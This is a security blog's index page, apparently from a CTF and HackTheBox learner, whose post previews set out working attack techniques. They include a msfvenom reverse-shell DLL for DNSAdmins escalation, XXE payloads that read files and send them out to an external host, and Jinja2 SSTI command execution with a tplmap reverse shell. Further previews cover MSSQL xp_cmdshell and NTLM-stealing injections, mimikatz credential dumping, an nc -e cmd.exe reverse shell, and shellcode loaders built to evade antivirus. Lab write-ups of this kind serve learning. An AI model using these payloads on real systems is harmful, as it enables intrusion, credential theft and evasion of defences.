<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Twe1ve&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
  <meta property="og:type" content="website">
<meta property="og:title" content="Twe1ve&#39;s Blog">
<meta property="og:url" content="https://github.com/index.html">
<meta property="og:site_name" content="Twe1ve&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="icon" href="/images/icon.png">
  
  
<link rel="stylesheet" href="/css/index.css">



  <!-- 百度站長統計-->
  
  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?f4e4f3d9d2532faa71e451f2ab41cbb6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>
  
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Twe1ve's Blog" type="application/atom+xml">
</head>

<div class="main height-100 flex flex-v">
  <div class="phone-header">
    <a to="/home" class="mobile-logo" > <img src="/images/logo.svg" /> </a>
    <a class="menu iconfont icon-menu" onclick="toggleMenu()"></a>
  </div>
  <div class="main-top flex flex1">
    <nuxt-link  to="/home" class="mobile-nav-btn iconfont icon-fenlei"></nuxt-link>
    <!--主页上左部分-->
    <div class="height-100 main-left  flex flex-v">
      <div class="main-left-top flex1">
        <a class="logo">
          <img src="/images/logo.svg" />
          <div class="sub-title">废物Twe1ve的垃圾展示台</div>
        </a>
        <nav class="nav">

  
    
      <a title="首页"  alt="首页"  v-for="(menu,index) in menus" href="/">
        <div class="icon"><i class="iconfont icon-home"></i></div>
        <div class="name">
          <div class="cnname">首页</div>
          <div class="enname">Home Page</div>
        </div>
      </a>

    
      <a title="归档"  alt="归档"  v-for="(menu,index) in menus" href="/archives">
        <div class="icon"><i class="iconfont icon-archives"></i></div>
        <div class="name">
          <div class="cnname">归档</div>
          <div class="enname">Archive Page</div>
        </div>
      </a>

    
      <a title="关于我"  alt="关于我"  v-for="(menu,index) in menus" href="./../about">
        <div class="icon"><i class="iconfont icon-about"></i></div>
        <div class="name">
          <div class="cnname">关于我</div>
          <div class="enname">About Me</div>
        </div>
      </a>

    
  

  <!--<a href="/link/">
    <div class="icon"><i class="iconfont icon-link"></i></div>
    <div class="name">
      <div class="cnname">友情链接</div>
      <div class="enname">Friends Web Link</div>
    </div>
  </a>-->
</nav>

      </div>

      <view class="website-msg">
        <div class="beian"><a target="_blank" href="http://www.miitbeian.gov.cn/"></a></div>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <div class="beian"><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></div>
        <!--
        <div class="theme-drsc">PowerBy:<a href="https://hexo.io" target="_blank">Hexo</a> ThemeBy:<a href="" target="_blank">Soul</a></div>
        -->
        <div class="copyright">Copyright &#169 <a href="mailto:yorojogame@gmail.com">2020 Twe1ve&#39;s Blog</a> </div>
      </view>

      <div class="social flex flex-align-center ">
        
          
            
          
        
      </div>
    </div>
    <!--主页上右部分-->
    
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/" class="title">域控提权之DNSadmins</a>
    <section class="desc">
  默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限
利用条件：
拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权
whoami /groups  查看用户组

制作dll：
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 --platform=windows -f dll &gt; plugin.dll开启smb共享：（可通过net use \10.10.14.67\tw 检测是否能连通smbserver  ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可）
sudo impacket-smbserver tw .注入dll
dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.14.67\tw\plugin.dll监听：
nc -lvvp 444重启dns致使paylload生效：
sc.exe stop dns
sc.exe start dns或
sc.exe \\10.10.10.169 stop dns
sc.exe \\10.10.10.169 start dns  


</section>
    <p class="sub">Apr 30, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" class="title">XXE漏洞详解</a>
    <section class="desc">
  0x01、XXE原理：XXE：XML External Entity Injection；即XML外部实体注入（php版本大于5.4.45的默认不解析外部实体）
1、XML：Extensible Markup Language，可扩展标记基础XML被设计用来结构化、存储以及传输信息，且XML 允许创作者定义自己的标签和自己的文档结构。XML的构建模块结构如下：

XML元素

属性

实体     


以一个简单的XXE POC为例：
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  ###XML声明
&lt;!DOCTYPE test [                                ####文档类型定义（DTD）
&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;     ###定义实体名
]&gt;
&lt;test&gt;&amp;xxe;&lt;/test&gt;   ###文档元素，使用实体名2.DTD（文档类型定义）实体
定义XML文件中有哪些模块，这些模块能包含什么样的内容

DTD可以在XML文档内声明，也可以外部引用


内部声明DTD：
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [        定义此文档是 note 类型的文档。
&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;
 &lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型
  &lt;!ELEMENT from    (#PCDATA)&gt;     
  &lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body    (#PCDATA)&gt;
]&gt;
&lt;note&gt;
 &lt;to&gt;George&lt;/to&gt;
  &lt;from&gt;John&lt;/from&gt;
  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;&lt;/note&gt;引用外部DTD：
DTD文件内容：
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;
&lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型
&lt;!ELEMENT from    (#PCDATA)&gt;     
&lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body    (#PCDATA)&gt;引用DTD：
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE root SYSTEM &quot;http://xx.xx.xx.xx/evil.dtd&quot;&gt;
&lt;note&gt;
  &lt;to&gt;George&lt;/to&gt;
  &lt;from&gt;John&lt;/from&gt;
  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;
&lt;/note&gt;
ELEMENT被过滤的情况下，可以将ELEMENT写入到DTD，外部引用;或外带查询

3、为什么能形成注入？XML 外部实体可以解析外部文件的特性，使得攻击成为可能；当XML允许引用外部实体，关键字“SYSTEM”会令XML解析器从URI中读取内容，并允许它在XML文档中被替换简单的漏洞代码：
&lt;?php
libxml_disable_entity_loader (false);
$xmlfile = file_get_contents(&apos;php://input&apos;);
$dom = new DOMDocument();

# LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值
# LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件
$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$creds = simplexml_import_dom($dom);
$user = $creds-&gt;user;
$pass = $creds-&gt;pass;
#回显信息
  echo &quot;You have logged in as user $user&quot;;
###漏洞触发点在user元素中
?&gt;0x02、XXE漏洞验证：如上漏洞代码poc，paylaod.txt：
&lt;creds&gt;
&lt;user&gt; Ed &lt;/user&gt;
&lt;pass&gt; mypass &lt;/pass&gt;
&lt;/creds&gt;
tips：读php或html文件时：（由于带有&lt; , &gt;符号会导致解析错误，使用如下paylaod）

&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/xx.php&quot;&gt;curl验证：
curl -d @payload.txt http://localhost/xml_injectable.php显然这里是有回显的情况，无回显判断，一般还会监听一下我们的80端口是否收到对方的访问信息

0x03、XXE能做什么：[1]文件读取
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
[2]SSRF探测端口内网服务
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
尝试在XXE漏洞代码中加入：    error_reporting(0);

上边这个判断方法比较依赖于对方开启报错并回显；有回显但没有开启报错的情况下可以根据响应时间/长度，判断该端口是否已被开启（时间差还是很明显的）
[3]Bind XXE （OOB）外带数据（无回显攻击）
[代码中注释掉 echo “You have logged in as user $user”;]
OOB  文件读取
evil.dtd：
&lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &apos;http://47.112.182.89/%file;&apos;&gt;&quot;&gt;payload.txt(按理说是读取php或者html文件才需要base64，可是我这里不经过base是没有信息返回的)
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=C://windows//system.ini&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;
%dtd; %all;
]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
OOB  探测内网端口及服务：
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:3389&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;
%dtd; %all;
]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;0x04、攻击内网SSRF+内网服务命令执行实现内网攻击
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/ssrf.php?cmd=xxxxxxx&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;系统命令执行
(PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上时才可用)
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;0x05、使用递归实体扩展进行DOS攻击
0x06、XXE漏洞挖掘： 如何判断是否存在XML外部实体攻击?那就是寻找那些接受XML作为输入内容的端点，而有些端点可能并不是那么明显，比如一些仅使用JSON去访问服务的客户端，可以通过修改HTTP的请求或修改Content-Type头部字段等方法，然后看应用程序的响应，看程序是否解析了发送的内容，如果解析了，那么就可能存在XXE攻击漏洞
比如这个案例：https://www.freebuf.com/vuls/167087.html ；通过更改contentn type类型值来fuzz目标是否能够正常响应XML值
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
foo=bar等价于：（一般WAF只会拦截application/x-www-form-urlencoded，通过更改为其他类型如text/xml 或 application/xml可绕过 ）
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;1.文件上传XXE（XML、XLSX，DOCX，PPTX，SVG或任何XML MIME类型格式）
2.传输内容XXE （支持XML）
扩展之Json端点上的XXE：
原始JSON
{&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;}XML转换(需要添加一个根元素，不然会成为无效的XML文档)
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;root&gt;
&lt;search&gt;name&lt;/search&gt;
&lt;value&gt;netspitest&lt;/value&gt;
&lt;/root&gt;以HTB Fulcrum为例：疑似一个API返回一段json信息，但是我们没有能够与API进行交互的方法，只能尝试各种可能（OS[系统命令注入]、sqli、xxe、xpath等）

成功验证XXE



</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/" class="title">调用API绕过杀软添加用户</a>
    <section class="desc">
  创建隐藏账户：
net user tw$ password /add  ###用户名为tw，密码为password的
也可以通过修改注册表实现，需要system权限    如何发现隐藏账户：
通过组查看：
net localgroup administrators 
net localgroup users直接查看注册表，有什么用户一目了然HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过
实现：
微软提供C++实现原型：
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, &quot;netapi32.lib&quot;)

#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;
#include &lt;windows.h&gt; 
#include &lt;lm.h&gt;

int wmain(int argc, wchar_t *argv[])
{
   LPGROUP_USERS_INFO_0 pBuf = NULL;
   DWORD dwLevel = 0;
   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
   DWORD dwEntriesRead = 0;
   DWORD dwTotalEntries = 0;
   NET_API_STATUS nStatus;

   if (argc != 3)
   {
  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);
  exit(1);
   }

   nStatus = NetUserGetGroups(argv[1],
  argv[2],
  dwLevel,
  (LPBYTE*)&amp;pBuf,
  dwPrefMaxLen,
  &amp;dwEntriesRead,
  &amp;dwTotalEntries);

   if (nStatus == NERR_Success)
   {
  LPGROUP_USERS_INFO_0 pTmpBuf;
  DWORD i;
  DWORD dwTotalCount = 0;

  if ((pTmpBuf = pBuf) != NULL)
  {
 fprintf(stderr, &quot;\nGlobal group(s):\n&quot;);

 for (i = 0; i &lt; dwEntriesRead; i++)
 {
assert(pTmpBuf != NULL);

if (pTmpBuf == NULL)
{
   fprintf(stderr, &quot;An access violation has occurred\n&quot;);
   break;
}

wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);

pTmpBuf++;
dwTotalCount++;
 }
  }

  if (dwEntriesRead &lt; dwTotalEntries)
 fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);

  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);
   }
   else
  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);

   if (pBuf != NULL)
  NetApiBufferFree(pBuf);

   return 0;
}NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组
我用C实现效果如下：


</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="title">SSTI[服务器模板注入]</a>
    <section class="desc">
  漏洞成因：
用户输入未经过滤就交给引擎处理
将python语句编译成一句话： 
不同类型SSTI paylaod: 
SSTI模板注入常见引擎：

判断是哪种类型SSTI

一个实例：
nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI返回输入内容，已知

检测SSTI

name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）
确定是jinja之后，尝试文件读取和命令执行
读取文件
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
命令执行：
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}SSTI注入工具tplmap： 
python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999

</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/MSSQL-NTLM-stealer/" class="title">MSSQL NTLM stealer</a>
    <section class="desc">
  可窃取NTLM的漏洞及利用方式
利用原理MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。
如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希
环境说明：https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL SQLi，发现高权限账户但无法读取密码
漏洞利用
默认情况ASP/MSSQL支持堆叠注入：
常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed
猜测是没有权限的问题，想到xp_dirtree外带数据：
payload：
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-


</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/" class="title">mimikatz抓取密码小记</a>
    <section class="desc">
  1、直接抓取本机：
[1]#privilege::debug          //提升权限[2]#sekurlsa::logonpasswords  //抓取密码
离线破解lsass.dmp
[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来
[2]#privilege::debug          //提升权限
[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp
[4]#sekurlsa::logonpasswords  //抓取密码
踩坑点：
[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)相对路径报错    
解决方法：lsass.dmp要给完整路径，
[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key importmimikatz版本过低
解决方法：使用2.0版本
[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
windows 2012之后明文抓取均会出现这个报错
需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了
（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/" class="title">内网使用smb无文件执行</a>
    <section class="desc">
  创建smb共享
mkdir smb &amp;&amp; cd smb
cp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下
sudo impacket-smbserver share $(pwd) -smb2support -user Twe1ve -password  123456测试：
$pass = convertto-securestring &apos;123456&apos; -AsPlainText -Force
$cred= New-Object System.Management.Automation.PSCredential(&apos;Twe1ve&apos;,$pass)
New-PSDrive -name tw -PSProvider FileSystem -Credential $cred -Root \\10.10.14.61\share
执行：
Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd share:    ##进入共享磁盘

Evil-WinRM* PS share:\&gt; .\winPEAS.exe    ###执行

</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/" class="title">shell中实现runas命令</a>
    <section class="desc">
  有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果
$pass = convertTo-SecureString &apos;36mEAhz/B8xQ~2VM&apos; -AsPlainText -Force                     
$cred= New-Object System.Management.Automation.PSCredential(&quot;Sniper\Chris&quot;,$pass)
Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred  ###验证是否是正确的凭证
Invoke-Command -Computer Sniper -ScriptBlock { dir } -Credential $cred
Invoke-Command -Computer Sniper -ScriptBlock { C:\ProgramData\nc.exe 10.10.15.64  6636 -e cmd.exe } -Credential $cred  ##反弹shell

</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/CSharp%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/" class="title">C#底层调用powershell过杀软</a>
    <section class="desc">
  这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。
国内某数字杀软，会拦截powershell的运行，以前常用的复制powershell到当前目录执行也被拦截，或者修改empire中的特定函数同样被检测到,很多方式不再适用
从C#中调用
添加运行powershell需要的程序包：
C#调用powershell安装system.management.automation.dll：
管理NuGet程序包-&gt;浏览-&gt;搜索system.management.automation-&gt;选择system.management.automation.dll-&gt;重新生成项目即可
using System;
 using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.Management.Automation.Runspaces;
 public class Program
 {
 public static void Main()
 {
 }
 }
 [System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 {
 public override void Uninstall(System.Collections.IDictionary savedState)
 {
 Mycode.Exec();
 }
 }
 public class Mycode
 {
 public static void Exec()
 {
 string command = System.IO.File.ReadAllText(@&quot;C:\Users\fmc\Desktop\PowerUp.ps1&quot;);
 RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
 Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
 rspace.Open();
 Pipeline pipeline = rspace.CreatePipeline();
 pipeline.Commands.AddScript(command);
 pipeline.Invoke();
 }
 }PS1文件需要适当混淆以过静态查杀


</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/04/26/C%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%9D%80%E8%BD%AF/" class="title">C内存加载过杀软</a>
    <section class="desc">
  C的加载器有好几种，直接把shellcode放进源码中能够过静态层面的查杀，但是运行时会被查杀；
如最常用的加载器：
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)

unsigned char shellcode[] =
&quot;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&quot;
&quot;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&quot;
&quot;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&quot;
&quot;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&quot;
&quot;\x57\x78\x01\xc2\x8b\x7a\x20\x01&quot;
&quot;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&quot;
&quot;\x45\x81\x3e\x43\x72\x65\x61\x75&quot;
&quot;\xf2\x81\x7e\x08\x6f\x63\x65\x73&quot;
&quot;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&quot;
&quot;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&quot;
&quot;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&quot;
&quot;\xb1\xff\x53\xe2\xfd\x68\x63\x61&quot;
&quot;\x6c\x63\x89\xe2\x52\x52\x53\x53&quot;
&quot;\x53\x53\x53\x53\x52\x53\xff\xd7&quot;;
void main()
{
    ((void(*)(void))&amp;shellcode)();
}解决方法1：加密shellcode再解密运行（最后用一些比较偏的加密算法）
解决方法2：pyaload分离[1]借助main的入口参数，用户直接输shellcode
[2]从txt文件中加载shellcode
这个当初比较头疼，因为C语言这方面确实不大行，从txt读取shellcode的时候出现问题;记录如下：

获取txt中shellcode长度，申请内存空间


.使用fread读取txt为字符串，加载难以识别出shellcode    


.fscanf判定shellcode分割符需要进行转义(这点是乔哥解决的，我乔哥还是强啊)



</section>
    <p class="sub">Apr 26, 2020</p>
  </div>
</div>-->
<!---->
<!--
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
  </nav>

-->

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.0.2/css/swiper.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.0.2/js/swiper.min.js"></script>
<div class="main-right flex1 flex flex-v">
    <div class="box-content flex1">
        <div class="swiper-container">
            <div class="swiper-wrapper">
                
                    <a title="域控提权之DNSadmins" alt="域控提权之DNSadmins" href="/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="域控提权之DNSadmins" alt="域控提权之DNSadmins"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 域控提权之DNSadmins &gt;</div>
                            <div class="content flex1">
                                
  默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限
利用条件：
拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权
whoami /groups  查看用户组

制作dll：
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 --platform=windows -f dll &gt; plugin.dll开启smb共享：（可通过net use \10.10.14.67\tw 检测是否能连通smbserver  ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可）
sudo impacket-smbserver tw .注入dll
dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.14.67\tw\plugin.dll监听：
nc -lvvp 444重启dns致使paylload生效：
sc.exe stop dns
sc.exe start dns或
sc.exe \\10.10.10.169 stop dns
sc.exe \\10.10.10.169 start dns  



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 30, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="XXE漏洞详解" alt="XXE漏洞详解" href="/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="XXE漏洞详解" alt="XXE漏洞详解"
                                     src="/images/default.jpg"></img>
                            
                        </div>
